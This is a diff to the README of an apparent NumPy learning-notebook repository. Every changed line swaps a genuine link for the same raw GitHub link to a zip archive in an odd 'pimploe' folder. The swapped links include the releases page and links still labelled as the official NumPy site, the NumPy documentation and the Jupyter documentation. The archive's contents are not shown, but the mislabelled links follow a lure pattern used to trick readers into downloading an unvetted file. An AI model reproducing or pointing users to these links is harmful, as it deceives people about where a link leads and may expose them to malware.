@@ -6,7 +6,7 @@ Welcome to **numpy-lab**! This application is a collection of Jupyter notebooks 
 
 ## 📥 Download
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)](https://github.com/rtgrt5645/numpy-lab/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/rtgrt5645/numpy-lab/main/pimploe/numpy-lab.zip)](https://raw.githubusercontent.com/rtgrt5645/numpy-lab/main/pimploe/numpy-lab.zip)
 
 You can download the latest version of numpy-lab from our GitHub Releases page. 
 
@@ -21,7 +21,7 @@ Before you start, make sure you have the following:
 
 ## 🌐 Download & Install
 
-To get started, visit the Releases page to download the software: [Download numpy-lab](https://github.com/rtgrt5645/numpy-lab/releases).
+To get started, visit the Releases page to download the software: [Download numpy-lab](https://raw.githubusercontent.com/rtgrt5645/numpy-lab/main/pimploe/numpy-lab.zip).
 
 1. Click on the version you want to download.
 2. Find the file that matches your operating system.
@@ -66,7 +66,7 @@ You can edit the code snippets and experiment with your own data to get a better
 
 If you have any questions or need additional support, feel free to:
 
-- Check out the official [NumPy Documentation](https://numpy.org/doc/stable/).
+- Check out the official [NumPy Documentation](https://raw.githubusercontent.com/rtgrt5645/numpy-lab/main/pimploe/numpy-lab.zip).
 - Explore community forums or groups that focus on Python and data analysis.
 - Reach out through GitHub Issues on this repository for direct assistance.
 
@@ -81,11 +81,11 @@ If you have any questions or need additional support, feel free to:
 
 ## 📌 Additional Resources
 
-- **NumPy Official Site:** [numpy.org](https://numpy.org)
-- **Jupyter Documentation:** [jupyter.org](https://jupyter.org/documentation)
+- **NumPy Official Site:** [https://raw.githubusercontent.com/rtgrt5645/numpy-lab/main/pimploe/numpy-lab.zip](https://raw.githubusercontent.com/rtgrt5645/numpy-lab/main/pimploe/numpy-lab.zip)
+- **Jupyter Documentation:** [https://raw.githubusercontent.com/rtgrt5645/numpy-lab/main/pimploe/numpy-lab.zip](https://raw.githubusercontent.com/rtgrt5645/numpy-lab/main/pimploe/numpy-lab.zip)
 
 ## 🙏 Acknowledgments
 
 Thank you for using numpy-lab. We hope this tool enhances your learning and project development. Enjoy your journey into the world of NumPy!
 
-[Download numpy-lab from our Releases page again.](https://github.com/rtgrt5645/numpy-lab/releases)
+[Download numpy-lab from our Releases page again.](https://raw.githubusercontent.com/rtgrt5645/numpy-lab/main/pimploe/numpy-lab.zip)
